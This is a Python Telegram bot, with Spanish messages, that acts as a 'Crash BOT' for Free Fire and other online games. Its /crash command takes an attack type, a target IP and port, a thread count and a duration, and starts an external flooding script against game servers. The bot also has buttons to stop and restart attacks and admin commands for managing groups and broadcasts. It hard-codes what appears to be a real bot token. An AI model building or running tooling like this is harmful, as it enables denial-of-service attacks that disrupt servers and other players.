# -*- coding: utf-8 -*-
import telebot
import subprocess
import json
import os
import time
from threading import Lock, Thread, Timer
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7370453046:AAEqfvIrr2wmiexVdpDJpIH0zc8TLqJs5NM"
ADMIN_ID = 7178876305
YOUTUBE_LINK = "@krizzzmodzofc3"
YOUTUBE2_LINK = "https://youtube.com/@krizzzmodzofc3"
TUTORIAL_LINK = "JEV1ZyM_4n4"
GROUP_LINK = "@crashbotff"  # Reemplaza con el enlace de tu grupo
START_PY_PATH = "/workspaces/KzTeamADM/start.py"


bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}
spam_cooldowns = {}  # Diccionario para rastrear el tiempo de silencio por spam

# Rutas de archivos JSON
groups_file = "groups.json"
users_file = "users.json"

# Verifica si el archivo de grupos existe, si no, lo crea
if not os.path.exists(groups_file):
    with open(groups_file, "w") as f:
        json.dump({"groups": []}, f)

# Verifica si el archivo de usuarios existe, si no, lo crea
if not os.path.exists(users_file):
    with open(users_file, "w") as f:
        json.dump({"users": []}, f)

# Guardar tiempo de inicio del bot
start_time = time.time()

def load_groups():
    """Carga los grupos desde el archivo JSON"""
    with open(groups_file, "r") as f:
        data = json.load(f)
    return data["groups"]

def save_groups(groups):
    """Guarda los grupos en el archivo JSON"""
    with open(groups_file, "w") as f:
        json.dump({"groups": groups}, f)

def load_users():
    """Carga la lista de usuarios desde el archivo JSON."""
    with open(users_file, "r") as f:
        return json.load(f)["users"]

def save_users(users):
    """Guarda la lista de usuarios en el archivo JSON."""
    with open(users_file, "w") as f:
        json.dump({"users": users}, f)

def add_user(user_id):
    """Agrega un usuario a la lista si no está registrado."""
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        save_users(users)

def is_allowed(message):
    """Verifica si el mensaje proviene de un grupo autorizado o si es del admin en privado."""
    groups = load_groups()
    user_id = message.from_user.id

    # Permitir el comando /register sin verificación
    if message.text.startswith("/register"):
        return True

    # Verificar si el usuario está registrado
    users = load_users()
    if user_id not in users:
        bot.reply_to(message, "❌ *Usuário No Registrado*\nUsa el comando /register para registrarte.", parse_mode="Markdown")
        return False

    # Verificar si el mensaje proviene de un grupo autorizado o si es del admin en privado
    if message.chat.id in groups or (message.chat.type == "private" and user_id == ADMIN_ID):
        return True

    bot.reply_to(message, f"❌ ¡Este bot solo funciona en los grupos autorizados!\n🔗 Únete a nuestro grupo de 𝙁𝙧𝙚𝙚 𝙁𝙞𝙧𝙚 aquí: {GROUP_LINK}\n\n Suscribete a mi canal de YouTube: {YOUTUBE2_LINK}")
    return False

def check_shutdown_time():
    """Verifica el tiempo restante y notifica a los grupos cuando falten 5 minutos."""
    while True:
        elapsed_time = time.time() - start_time
        remaining_time = max(0, 240 * 60 - elapsed_time)  # 140 minutos en segundos

        if remaining_time <= 300:  # 5 minutos en segundos
            groups = load_groups()
            for group_id in groups:
                try:
                    bot.send_message(
                        group_id,
                        "⚠️ *Aviso Importante:*\n\n"
                        "El bot se apagará en **5 minutos** debido a límites de tiempo.\n"
                        "Un administrador lo reactivará pronto. Por favor, sean pacientes.\n\n"
                        "¡Gracias por su comprensión! 🙏",
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

            # Esperar a que el bot se apague
            time.sleep(300)  # Esperar 5 minutos
            break

        time.sleep(60)  # Verificar cada minuto

def notify_groups_bot_started():
    """Notifica a los grupos que el bot ha sido encendido."""
    groups = load_groups()
    for group_id in groups:
        try:
            bot.send_message(
                group_id,
                "✅ *¡Bot Online Nuevamente!*\n \n"
                "Úsalo con responsabilidad y no para hacer maldades.\n\n"
                "𝙔𝙤𝙪𝙏𝙪𝙗𝙚: 𝙆𝙧𝙞𝙯𝙯𝙕𝙈𝙤𝙙𝙯 🇵🇪 𝙊𝙁𝘾",
                parse_mode="Markdown",
            )
        except Exception as e:
            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

# Comando /register
@bot.message_handler(commands=["start"])
@bot.message_handler(commands=["register"])
def handle_register(message):
    user_id = message.from_user.id
    add_user(user_id)  # Asegura que el usuario quede registrado
    
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton("🔥TUTORIAL🔥", url=f"tg://user?id={ADMIN_ID}")
    markup.add(button)
    button = InlineKeyboardButton("🔰YouTube Channel🔰", url=f"https://youtube.com/{YOUTUBE_LINK}")
    markup.add(button)

    bot.send_message(
        message.chat.id,
        "🎮 *¡Bienvenido al Crash BOT [Free Fire]* 🚀\n\n"
        "Usuario registrado con éxito✅️\n\n"
        "Para seguir usando este bot tienes que suscribirte a mi canal de YouTube \n\n"
        "🔧 Usa /help para ver los comandos disponibles.",
        reply_markup=markup,
        parse_mode="Markdown",
    )
    
# Comando /ID
@bot.message_handler(commands=["ID"])
def handle_id(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.chat.type == "private":
        bot.reply_to(message, f"✅ *Tu ID de usuario es:* `{user_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"✅ *Tu ID de usuario es:* `{user_id}`\n*El ID del grupo es:* `{chat_id}`", parse_mode="Markdown")
# Resto del código (sin cambios)
# ...
@bot.message_handler(commands=["crash"])
def handle_ping(message):
    if not is_allowed(message):
        return

    telegram_id = message.from_user.id

    # Verificar cooldown
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Espera 10 segundos antes de intentar de nuevo.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!*❌️\n\n"
                "📌 *Uso correcto:*\n"
                "`/crash <TIPO> <IP/HOST:PUERTO> <THREADS> <MS>`\n\n"
                "💡 *Ejemplo de uso:*\n"
                "`/crash UDP 128.1.200.199:10016 2 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = int(args[3])  # Convertir a entero
    duration = int(args[4])  # Convertir a entero

    # Validar límites
    if threads > 3:
        bot.reply_to(message, "❌ El número máximo de threads es 2.")
        return

    if duration > 900:
        bot.reply_to(message, "❌ La duración máxima es de 900 segundos.")
        return

    command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()
        cooldowns[f"last_command_{telegram_id}"] = message.text  # Guardar el último comando

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔Detener Ataque⛔", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*🔰CRASH BOT - INICIADO🔰*\n\n"
                f"🌐 *Server:* {ip_port}\n"
                f"🧟‍♀️ *Threads:* {threads}\n"
                f"⏳ *Duración:* {duration} segundos\n\n"
                "*𝙔𝙤𝙪𝙏𝙪𝙗𝙚: 𝙆𝙧𝙞𝙯𝙯𝙕𝙈𝙤𝙙𝙯 🇵🇪 𝙊𝙁𝘾* "
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al iniciar el ataque:* {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        try:
            bot.answer_callback_query(
                call.id, "❌ *Solo el usuario que inició el ataque puede detenerlo.*"
            )
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        try:
            bot.answer_callback_query(call.id, "✅ Ataque finalizado con éxito.")
            
            # Crear botón para realizar el ataque nuevamente
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 INICIAR ATAQUE NUEVAMENTE", callback_data=f"restart_attack_{telegram_id}"))

            bot.edit_message_text(
                "*[⛔] ATAQUE FINALIZADO [⛔]*\n\n"
                "Este mensaje desaparecera en  **16 segundos**.",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                reply_markup=markup,
                parse_mode="Markdown",
            )

            # Programar la eliminación del mensaje después de 20 segundos
            Timer(20, delete_message, args=(call.message.chat.id, call.message.message_id)).start()
        except Exception as e:
            print(f"Error al responder a la consulta de callback o editar el mensaje: {str(e)}")
    else:
        try:
            bot.answer_callback_query(call.id, "❌ *No hay ataques activo para detener.*")
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")

def delete_message(chat_id, message_id):
    """Elimina el mensaje después de 20 segundos."""
    try:
        bot.delete_message(chat_id, message_id)
    except Exception as e:
        print(f"Error al eliminar el mensaje: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack_"))
def handle_restart_attack(call):
    telegram_id = int(call.data.split("_")[2])  # Extraer el ID del usuario que inició el ataque

    if call.from_user.id != telegram_id:  # Verificar si el usuario que presionó el botón es el mismo que inició el ataque
        try:
            bot.answer_callback_query(
                call.id, "❌ *Solo el usuario que inició el ataque puede iniciarlo nuevamente.*"
            )
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    # Verificar si el usuario está silenciado por spam
    if telegram_id in spam_cooldowns and time.time() - spam_cooldowns[telegram_id] < 60:
        bot.answer_callback_query(
            call.id, "❌ *Has hecho demasiadas solicitudes. Espera 20 segundos antes de intentar de nuevo.*"
        )
        return

    # Verificar si el tiempo de espera para reiniciar el ataque ha expirado
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        # Obtener el último comando de ataque del usuario
        last_command = cooldowns.get(f"last_command_{telegram_id}")
        if not last_command:
            try:
                bot.answer_callback_query(call.id, "❌ No hay un ataque previo para repetir.")
            except Exception as e:
                print(f"Error al responder a la consulta de callback: {str(e)}")
            return

        # Ejecutar el último comando de ataque
        try:
            args = last_command.split()
            attack_type = args[1]
            ip_port = args[2]
            threads = int(args[3])  # Convertir a entero
            duration = int(args[4])  # Convertir a entero

            # Validar límites
            if threads > 2:
                bot.answer_callback_query(call.id, "❌ El número máximo de threads  es 2.")
                return

            if duration > 900:
                bot.answer_callback_query(call.id, "❌ La duración máxima permitida es de 900 segundos.")
                return

            command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[telegram_id] = process
            cooldowns[telegram_id] = time.time()  # Actualizar el cooldown

            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("⛔ Detener Ataque ⛔", callback_data=f"stop_{telegram_id}"))

            bot.edit_message_text(
                "*🔰CRASH BOT - INICIADO🔰*\n\n"
                f"🌐 *Server:* {ip_port}\n"
                f"🧟‍♀️ *Threads:* {threads}\n"
                f"⏳ *Duración:* {duration} segundos\n\n"
                "𝙔𝙤𝙪𝙏𝙪𝙗𝙚: 𝙆𝙧𝙞𝙯𝙯𝙕𝙈𝙤𝙙𝙯 🇵🇪 𝙊𝙁𝘾 ",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                reply_markup=markup,
                parse_mode="Markdown",
            )
            bot.answer_callback_query(call.id, "✅ *Ataque reiniciado con éxito.*")
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ *Error al reiniciar el ataque:* {str(e)}")

        # Silenciar al usuario si hace spam
        if telegram_id in spam_cooldowns:
            spam_cooldowns[telegram_id] = time.time()
        else:
            spam_cooldowns[telegram_id] = time.time()
    else:
        bot.answer_callback_query(call.id, "❌ *El tiempo para reiniciar el ataque ha expirado.*")

@bot.message_handler(commands=["addgroup"])
def handle_addgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede agregar grupos.*")
        return

    try:
        # Obtener ID del grupo
        group_id = int(message.text.split()[1])
        groups = load_groups()

        # Verificar si el grupo ya está en la lista
        if group_id in groups:
            bot.reply_to(message, "❌ *Este grupo ya está en la lista.*")
            return

        # Agregar el grupo y guardar
        groups.append(group_id)
        save_groups(groups)

        bot.reply_to(message, f"✅ *Grupo {group_id} agregado correctamente.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["removegroup"])
def handle_removegroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Solo el admin puede eliminar el bot de los grupos.")
        return

    if message.chat.type != "private":
        bot.reply_to(message, "❌ Este comando solo puede usarse en privado.")
        return

    try:
        group_id = int(message.text.split()[1])
        groups = load_groups()

        # Verificar si el grupo está en la lista
        if group_id not in groups:
            bot.reply_to(message, "❌ Este grupo no está en la lista.")
            return

        # Eliminar el grupo y guardar
        groups.remove(group_id)
        save_groups(groups)

        # El bot abandona el grupo
        bot.leave_chat(group_id)

        bot.reply_to(message, f"✅ *Bot eliminado correctamente del grupo {group_id}.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["listgroups"])
def handle_listgroups(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede ver la lista de grupos.*")
        return

    groups = load_groups()
    if not groups:
        bot.reply_to(message, "❌ *No hay grupos autorizados.*")
        return

    groups_list = "\n".join([f"📍 *Grupo ID:* {group_id}" for group_id in groups])
    bot.reply_to(
        message,
        f"📋 *Grupos autorizados:*\n{groups_list}",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
def handle_help(message):
    if not is_allowed(message):
        return

    bot.send_message(
        message.chat.id,
        (
            "🔧 *¿Cómo usar este bot?* 🤖\n\n"
            "Este bot fue creado para facilitarte a ejecutar ataques en Todos los juegos online.\n\n"
            "*Comandos disponibles:*\n"
            "1. /start: Inicia el bot y te da una breve introducción.\n"
            "2. /crash <TIPO> <IP/HOST:PUERTO> <THREADS> <MS>: Pone ping 999 a la partida.\n"
            "3. `/addgroup <ID del grupo>`: Agrega un grupo a la lista de grupos permitidos (solo admin).\n"
            "4. `/removegroup <ID del grupo>`: Elimina un grupo de la lista de grupos permitidos (solo admin).\n"
            "5. /help: Muestra esta ayuda.\n"
            "6. /timeactive: Muestra el tiempo activo del bot y el tiempo restante antes de que se cierre.\n"
            "7. `/broadcast <mensaje>`: Envía un mensaje a todos los usuarios registrados (solo admin).\n"
            "8. `/broadcastgroup <mensaje>`: Envía un mensaje a todos los grupos autorizados (solo admin).\n\n"
            "¡TUTORIAL >> https://t.me/KrizzZModzOFC3/2913 ! "
        ),
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["timeactive"])
def handle_timeactive(message):
    if not is_allowed(message):
        return

    elapsed_time = time.time() - start_time
    remaining_time = max(0, 240 * 60 - elapsed_time)  # 140 minutos en segundos

    elapsed_minutes = int(elapsed_time // 60)
    elapsed_seconds = int(elapsed_time % 60)

    remaining_minutes = int(remaining_time // 60)
    remaining_seconds = int(remaining_time % 60)

    bot.reply_to(
        message,
        (
            f"🕒 *Tiempo activo del bot:*\n"
            f"✅ *Tiempo transcurrido:* {elapsed_minutes}m {elapsed_seconds}s\n"
            f"⚠️ *Tiempo restante:* {remaining_minutes}m {remaining_seconds}s\n\n"
            "🚀 *Recuerda que el bot se desactiva automáticamente después de 240 minutos.*"
        ),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede usar este comando.*")
        return

    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Debes escribir un mensaje después de /broadcast.*")
        return

    users = load_users()
    success_count, fail_count = 0, 0

    for user_id in users:
        try:
            bot.send_message(user_id, f"𝙔𝙤𝙪𝙏𝙪𝙗𝙚: 𝙆𝙧𝙞𝙯𝙯𝙕𝙈𝙤𝙙𝙯 🇵🇪 𝙊𝙁𝘾\n \n {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"No se pudo enviar mensaje a {user_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensaje enviado a {success_count} usuarios. ❌ Falló en {fail_count}.")

@bot.message_handler(commands=["broadcastgroup"])
def handle_broadcastgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede usar este comando.*")
        return

    text = message.text.replace("/broadcastgroup", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Debes escribir un mensaje después de /broadcastgroup.*")
        return

    groups = load_groups()
    success_count, fail_count = 0, 0

    for group_id in groups:
        try:
            bot.send_message(group_id, f"𝙔𝙤𝙪𝙏𝙪𝙗𝙚: 𝙆𝙧𝙞𝙯𝙯𝙕𝙈𝙤𝙙𝙯 🇵🇪 𝙊𝙁𝘾\n \n {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensaje enviado a {success_count} grupos. ❌ Falló en {fail_count}.")

if __name__ == "__main__":
    # Notificar a los grupos que el bot ha sido encendido
    notify_groups_bot_started()

    # Iniciar el hilo para verificar el tiempo de apagado
    shutdown_thread = Thread(target=check_shutdown_time)
    shutdown_thread.daemon = True
    shutdown_thread.start()

    # Iniciar el bot
    bot.infinity_polling()